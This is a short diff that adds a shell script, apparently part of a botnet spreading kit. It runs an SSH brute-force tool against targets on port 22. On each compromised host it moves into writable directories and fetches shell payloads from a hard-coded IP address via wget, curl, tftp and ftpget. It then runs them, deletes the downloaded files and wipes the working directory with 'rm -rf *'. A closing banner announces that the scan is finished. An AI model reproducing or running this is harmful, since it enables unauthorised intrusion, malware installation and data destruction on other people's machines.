@@ -1,0 +1,4 @@
+clear
+./brute 9500 -f $1 naffey 22 "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.95.169.105/omicron.sh; curl -O http://45.95.169.105/omicron.sh; chmod 777 omicron.sh; sh omicron.sh; tftp 45.95.169.105 -c get 0xt984767.sh; chmod 777 0xft6426467.sh; sh 0xft6426467.sh; tftp -r 0xtf2984767.sh -g 45.95.169.105; chmod 777 0xtf2984767.sh; sh 0xtf2984767.sh; ftpget -v -u anonymous -p anonymous -P 21 45.95.169.105 0xft6426467.sh 0xft6426467.sh; sh 0xft6426467.sh; rm -rf 0xt984767.sh 0xtf2984767.sh 0xft6426467.sh; rm -rf *"
+clear
+echo -e "\e[35m[PRIVATE] \e[97mXx91.134.143.125xX - \e[32mScan Has Been Finished ! All Output has been saved in --> \e[91mgasite.txt"
